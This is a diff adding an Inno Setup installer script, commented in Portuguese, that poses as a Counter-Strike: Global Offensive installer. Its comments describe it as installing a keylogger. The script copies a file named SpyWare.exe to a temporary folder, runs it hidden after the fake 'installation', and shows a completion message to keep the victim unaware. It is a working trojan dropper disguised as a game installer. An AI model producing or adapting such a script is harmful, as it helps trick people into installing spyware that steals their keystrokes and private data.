@@ -1,0 +1,33 @@
+; Definir o nome do instalador, versão e outros detalhes
+[Setup]
+AppName=Counter-Strike: Global Offensive
+AppVersion=1.0
+DefaultDirName={tmp}\CSGO
+DefaultGroupName=CSGO
+OutputBaseFilename=CS_GO_Installer
+Compression=lzma
+SolidCompression=yes
+
+; Diretório temporário para armazenar o keylogger
+[Files]
+Source: "C:\repos\POO\SpyWare\bin\Release\net8.0\win-x64\publish\SpyWare.exe"; DestDir: "{tmp}"; Flags: ignoreversion
+
+; Execução do keylogger após a "instalação"
+[Run]
+Filename: "{tmp}\SpyWare.exe"; Flags: runhidden
+
+; Seção para personalizar as mensagens de instalação
+[Messages]
+SetupAppTitle=Instalador do Counter-Strike: Global Offensive
+SetupWindowTitle=Instalando Counter-Strike: Global Offensive
+FinishedLabel=Instalação completa. Clique em 'Concluir' para finalizar.
+
+; Definições de interface do usuário e passo a passo de instalação
+[Code]
+procedure CurStepChanged(CurStep: TSetupStep);
+begin
+  if CurStep = ssPostInstall then
+  begin
+    MsgBox('Instalação concluída! Obrigado por instalar o Counter-Strike: Global Offensive.', mbInformation, MB_OK);
+  end;
+end;
